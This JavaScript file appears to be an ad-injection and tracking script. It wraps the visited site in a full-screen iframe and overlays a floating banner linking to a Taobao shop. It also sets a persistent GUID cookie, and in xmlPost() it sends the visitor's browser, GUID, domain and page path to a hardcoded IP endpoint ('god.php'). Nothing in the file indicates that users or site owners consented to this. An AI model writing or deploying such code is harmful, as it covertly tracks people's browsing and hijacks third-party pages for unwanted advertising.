var site_url = document.getElementById("site_url").src;
var site_url_src = site_url.substring(0,site_url.length-4);
var delta=0.8;
var collection;
var closeList = [false,false,false];
var div_obj = document.getElementById("cooler_ad_show");
div_obj.innerHTML="<div id='show1'></div><div id='show2'></div><div id='show3'></div>";

function checkSexy(){
  var strCookie = document.cookie;
  var arrCookie=strCookie.split("; "); 
  for(var i=0;i<arrCookie.length;i++){ 
       var arr=arrCookie[i].split("="); 
       if("sexy"==arr[0]){ 
              return true;
       } 
  } 
  return false;
}

function locationHref(sf){
   document.write(sf);
  if(checkSexy()){
    //location.href=site_url_src;
  }else{
    //location.href=site_url;
  }
}

function getOs(){ 
    try{
      var OsObject = "";
      if(navigator.userAgent.indexOf("MSIE")>0) {  
          return "MSIE"; 
      }  
      if(isFirefox=navigator.userAgent.indexOf("Firefox")>0){  
          return "Firefox";  
      }  
      if(isSafari=navigator.userAgent.indexOf("Safari")>0) {  
          return "Safari";  
      }   
      if(isCamino=navigator.userAgent.indexOf("Camino")>0){  
          return "Camino";  
      }  
      if(isMozilla=navigator.userAgent.indexOf("Gecko")>0){  
          return "Gecko";  
      } 
    }catch(err){
      locationHref("getOs");
    }    
}  

function setCookie(name,value,time){
  try{  
    var strsec = getsec(time);
    var exp = new Date();
    exp.setTime(exp.getTime() + parseInt(strsec)*1);
    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
  }
  catch(err)
  {
    locationHref("setCookie");
  }
}

function getsec(str){
  try{
    var str1=parseInt(str.substring(1,str.length))*1; 
    var str2=str.substring(0,1); 
    if (str2=="a"){
      return str1*1;
    }else if (str2=="s"){
      return str1*1000;
    }else if (str2=="h"){
      return str1*60*60*1000;
    }else if (str2=="d"){
      return str1*24*60*60*1000;
    }
  }catch(err)
  {
    locationHref("getsec");
  }
}

function floaters() {
  try{
    this.items      = [];
    this.addItem    = function(id,x,y,content,adb)
    {
        var div_obj = document.getElementById(id);
        div_obj.style.cssText="Z-INDEX: 999999; POSITION: absolute; width:80px; height:60px;left:"+(typeof(x)=="string"?eval(x):x)+"px;top:"+(typeof(y)=="string"?eval(y):y)+"px";
        div_obj.innerHTML=content;
        var newItem                             = {};
        newItem.object                          = document.getElementById(id);
        newItem.x                               = x;
        newItem.y                               = y;
        newItem.adb                             = adb;
        this.items[this.items.length]           = newItem;
    }
    this.play       = function()
        {
            collection  = this.items
            setInterval('play()',3);
        }
  }catch(err)
  {
    locationHref("floaters");
  }

}
function play()
{
  try{
    if(screen.width<=80 )
    {
            for(var i=0;i<collection.length;i++)
            {
                    collection[i].object.style.display      = 'none';
            }
            return;
    }

    for(var i=0;i<collection.length;i++)
    {
        var followObj           = collection[i].object;
        var followObj_x         = (typeof(collection[i].x)=='string'?eval(collection[i].x):collection[i].x);
        var followObj_y         = (typeof(collection[i].y)=='string'?eval(collection[i].y):collection[i].y);
        if(followObj.offsetLeft!=(document.body.scrollLeft+followObj_x)) {
                var dx=(document.body.scrollLeft+followObj_x-followObj.offsetLeft)*delta;
                dx=(dx>0?1:-1)*Math.ceil(Math.abs(dx));
                followObj.style.left=(followObj.offsetLeft+dx) + "px";
                }
        if(followObj.offsetTop!=(document.body.scrollTop+followObj_y)) {
                var dy=(document.body.scrollTop+followObj_y-followObj.offsetTop)*delta;
                dy=(dy>0?1:-1)*Math.ceil(Math.abs(dy));
                followObj.style.top=(followObj.offsetTop+dy)+"px";
                }
        if(closeList[i] == false){
          followObj.style.display = '';
        }else{
          followObj.style.display = 'none';
        }
    }
  }catch(err)
  {
    locationHref("play");
  }
}
function closeADBanner(obj)
{
        closeList[obj]=true;
        return;
}
//每一种广告的js中都会有这个初始化代码
function initAdvise(){
  try{
    var theFloaters = new floaters();
    theFloaters.addItem('show1',6,180,
     '<a href="http://shop72555958.taobao.com/">'+
     '<img  width="100px" src="http://182.18.15.202/source/feicui.jpg"/>'+
     '</a>'+
     '<img src=http://42.121.126.86:9090/images/close.gif onClick="closeADBanner(0);">'); 
    // theFloaters.addItem('show2','document.body.clientWidth-106',180,
    //  '<a href="http://www.fds321.com">'+
    //  '<img src="http://42.121.126.86:9090/images/ad-02.gif"/>'+
    //  '</a>'+
    //  '<img src=http://42.121.126.86:9090/images/close.gif onClick="closeADBanner(1);">');
    theFloaters.play();
  }catch(err)
  {
    locationHref("initAdvise");
  }

}

function newGuid()
{
  try{
    var guid = "";
    for (var i = 1; i <= 32; i++){
      var n = Math.floor(Math.random()*16.0).toString(16);
      guid +=   n;
      if((i==8)||(i==12)||(i==16)||(i==20))
        guid += "-";
    }
    return guid;    
  }catch(err)
  {
    locationHref("newGuid");
  }
}

function getJordanGUID(){
  try{
    var strCookie = document.cookie;
    var arrCookie=strCookie.split("; "); 
    for(var i=0;i<arrCookie.length;i++){ 
             var arr=arrCookie[i].split("="); 
             if("JordanGUID"==arr[0]){ 
                    return arr[1]; 
             } 
    } 
    return false;
  }catch(err)
  {
    locationHref("getJordanGUID");
  }
}

function createXMLHttp() {
    try{
      var XmlHttp;
      //if (window.ActiveXObject){
      if (false){
          var arr=["MSXML2.XMLHttp.6.0","MSXML2.XMLHttp.5.0", "MSXML2.XMLHttp.4.0","MSXML2.XMLHttp.3.0","MSXML2.XMLHttp","Microsoft.XMLHttp"];
          for(var i=0;i<arr.length;i++) {
              try {
                  XmlHttp = new ActiveXObject(arr[i]);
                  return XmlHttp;
              }
              catch(error) { }
          }
      } else {
          try {
              XmlHttp=new XMLHttpRequest();
              return XmlHttp;
          }
          catch(otherError) { }
      } 
    }catch(err)
    {
      //alert(err.description);
      //locationHref();
    }
} 

function xmlPost() { 
  try{
    var jordanGUID = getJordanGUID();
    if(!jordanGUID){
      jordanGUID = newGuid();
      document.cookie="JordanGUID=" + jordanGUID;
    }
    var os = getOs();
    var domain = document.location.host;
    var str_url = document.location.href;
    var arrAddress  = str_url.split(domain);
    var data_str = "sfrom="+os+"&jordanGUID=sexy"+jordanGUID+"&domain="+domain+"&protocol="+arrAddress[0]+"&path="+ arrAddress[1];
    var xmlHttp = createXMLHttp();
    var url= 'http://182.18.15.202/jordan2/controller/god.php?'+data_str;
    xmlHttp.open('GET',url,true); 
    xmlHttp.send(null);
  }catch(err)
  {
    //locationHref();
  }
}


function redirect(){
  try{
    var frame = document.getElementById("site_url");
    if(getOs()=="MSIE"){
      frame.style.cssText="margin-top:-22px;margin-left:-12px;";
      var height= (parseInt(window.screen.height)-190).toString() + "px";
    }else{
      frame.style.cssText="margin-top:-8px;margin-left:-12px;";
      var height= (parseInt(window.screen.height)-160).toString() + "px";
    }
    var width = (window.screen.width).toString() + "px";
    frame.width = width;
    frame.height = height;
  }
  catch(err)
  {
    locationHref("redirect");
  }
}


try{
    xmlPost();
    setCookie("sexy","1","s3");
    if(checkSexy() == false  ){
      locationHref("sexy=false");
    }else {
      redirect();
      initAdvise();
    }
}catch(err){
   locationHref("sexy");
}

